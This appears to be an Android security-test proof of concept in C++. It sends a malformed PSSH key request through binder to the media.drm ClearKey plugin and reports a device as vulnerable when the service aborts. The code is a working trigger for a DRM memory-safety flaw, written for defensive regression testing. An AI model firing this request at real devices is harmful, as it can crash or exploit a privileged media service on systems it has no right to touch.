/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <utils/String16.h>
#include <utils/String8.h>

#include "../includes/common.h"

using namespace android;

static uint8_t pssh[28] = {
    0,    0,    0,    28,                            // Total Size
    'p',  's',  's',  'h',                           // PSSH
    1,    0,    0,    0,                             // Version
    0x10, 0x77, 0xef, 0xec, 0xc0, 0xb2, 0x4d, 0x02,  // System ID
    0xac, 0xe3, 0x3c, 0x1e, 0x52, 0xe2, 0xfb, 0x4b,
};

static Vector<uint8_t> sessionId;

static sp<IBinder> drmBinder;

static void handler(int) {
  ALOGI("Good, the test condition has been triggered");
  exit(EXIT_VULNERABLE);
}

static void readVector(Parcel &reply, Vector<uint8_t> &vector) {
  uint32_t size = reply.readInt32();
  vector.insertAt((size_t)0, size);
  reply.read(vector.editArray(), size);
}

static void writeVector(Parcel &data, Vector<uint8_t> const &vector) {
  data.writeInt32(vector.size());
  data.write(vector.array(), vector.size());
}

static void makeDrm() {
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> mediaDrmBinder = sm->getService(String16("media.drm"));

  Parcel data, reply;

  data.writeInterfaceToken(String16("android.media.IMediaDrmService"));
  mediaDrmBinder->transact(2 /* MAKE_DRM */, data, &reply, 0);

  drmBinder = reply.readStrongBinder();
}

static void createPlugin() {
  Parcel data, reply;

  data.writeInterfaceToken(String16("android.drm.IDrm"));
  uint8_t uuid[16] = {0x10, 0x77, 0xef, 0xec, 0xc0, 0xb2, 0x4d, 0x02,
                      0xac, 0xe3, 0x3c, 0x1e, 0x52, 0xe2, 0xfb, 0x4b};
  data.write(uuid, 16);
  data.writeString8(String8("ele7enxxh"));

  drmBinder->transact(3 /* CREATE_PLUGIN */, data, &reply, 0);
}

static void openSession() {
  Parcel data, reply;

  data.writeInterfaceToken(String16("android.drm.IDrm"));
  data.writeInt32(1 /* SW_SECURE_CRYPTO */);  // level
  drmBinder->transact(5 /* OPEN_SESSION */, data, &reply, 0);
  readVector(reply, sessionId);
}

static void getKeyRequest() {
  Parcel data, reply;

  data.writeInterfaceToken(String16("android.drm.IDrm"));
  Vector<uint8_t> initData;
  initData.appendArray(pssh, sizeof(pssh));
  writeVector(data, sessionId);
  writeVector(data, initData);
  data.writeString8(
      String8("video/mp4") /* kIsoBmffVideoMimeType */);  // mimeType
  data.writeInt32(1 /* KeyType::STREAMING */);            // keyType
  data.writeInt32(0);                                     // count

  drmBinder->transact(7 /*GET_KEY_REQUEST*/, data, &reply);
}

int main(void) {
  signal(SIGABRT, handler);

  makeDrm();

  createPlugin();

  openSession();

  getKeyRequest();

  return 0;
}
